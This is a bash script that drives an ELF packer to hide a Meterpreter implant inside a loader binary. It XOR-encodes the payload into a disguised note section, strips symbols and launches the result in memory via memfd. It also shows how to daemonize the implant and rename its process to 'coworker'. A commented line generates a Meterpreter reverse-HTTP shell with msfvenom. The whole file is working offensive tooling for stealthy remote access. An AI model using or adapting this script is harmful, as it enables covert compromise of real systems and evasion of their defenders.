#!/bin/bash

ELFPACK="./bin/elfpack"
ELFLDR="./bin/elfldr"

HOST_ELF_FILE=${ELFLDR}
WORK_DIR="/tmp/elfpack_staging"
DST_ELF_FILE="${WORK_DIR}/injected-cradle"  # Loader bootstrapping paylaod
PAYLOAD_FILE="${WORK_DIR}/mettle-shell.elf" # ELF payload

DST_ELF_SECTION=".note.gnu.buf[...]"
DST_ELF_META_ALGO="X"
DST_DESC_NAME=".rodata"
XOR_KEY=""

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
RESET=$(tput sgr0)


if [[ $# -eq 0 ]]
then
  echo "Need key. example ${0} 0x23"
  exit 1
fi

if [[ ! -d ${WORK_DIR} ]]
then
  mkdir -p ${WORK_DIR}
fi

XOR_KEY=$1

# Split arguments to injected cradle from the packer
PAY_OPTS=("$@")
PAY_OPTS=("${PAY_OPTS[@]:1}") # removes the first element


if [[ -f  $DST_ELF_FILE ]]
then
  /bin/rm $DST_ELF_FILE
fi


#echo [TASK: OPTIONAL] "${GREEN}" ============= Generating payload: mettle shell ${RESET} ================
#echo "msfvenom -p linux/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4443  -f elf \> ${WORK_DIR}/mettle-shell.elf"
#msfvenom -p linux/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4443  -f elf > ${WORK_DIR}/mettle-shell.elf

echo [TASK] "${GREEN}"Packing payload with $ELFPACK ${RESET}
printf  "%s" "${GREEN} Injecting loader ${HOST_ELF_FILE} with payload ${PAYLOAD_FILE} into destination ${DST_ELF_FILE} with options:
- as section ${DST_ELF_SECTION}
- as TOC record ${DST_DESC_NAME}
- with algo ${DST_ELF_META_ALGO}
- with key: ${XOR_KEY} ${RESET}
"

echo [CMD] ${RED} $ELFPACK ${HOST_ELF_FILE} ${PAYLOAD_FILE} ${DST_ELF_FILE} "${DST_ELF_SECTION}" ${DST_DESC_NAME} ${DST_ELF_META_ALGO} "${XOR_KEY}" ${RESET}
$ELFPACK ${HOST_ELF_FILE} ${PAYLOAD_FILE} ${DST_ELF_FILE} "${DST_ELF_SECTION}" ${DST_DESC_NAME} ${DST_ELF_META_ALGO} "${XOR_KEY}"

echo [TASK] ${GREEN}Stripping symbols but not sections ${RESET}
echo [CMD] ${RED} strip $DST_ELF_FILE ${RESET}
strip $DST_ELF_FILE

echo [TASK] ${GREEN}Prepareing package for execution ${RESET}
echo [CMD] ${RED} chmod +rx $DST_ELF_FILE
chmod +rx $DST_ELF_FILE

echo [TASK:OPTIONAL] ${GREEN} Executing package ${DST_ELF_FILE} ${RESET}

# No options how to run the stage supplied, give options
if [[ ${#PAY_OPTS[@]} -eq 0 ]]
then
  printf "%s" "No options supplied. Options available:

  # launch payload via uexec
  ${DST_ELF_FILE}

  # launch payload via memfd(4)
  ${DST_ELF_FILE} -m

  # launch daemonized (at loader level)
  ${DST_ELF_FILE} -d

  # loader: daemonize, launch via memfd(4), then pass params to payloads if any
  #Ex: mettle:
  # -b, --background <0|1> start as a background service (0 disable, 1 enable)
  # -n, --name <name>      name to start as
  # -c, --console
  ${DST_ELF_FILE} -m -d -- -b 0 -n coworker -c

  Choose one
  "
else
  echo [CMD]options: "${PAY_OPTS[@]}" ${RESET}
  $DST_ELF_FILE  "${PAY_OPTS[@]}"
fi


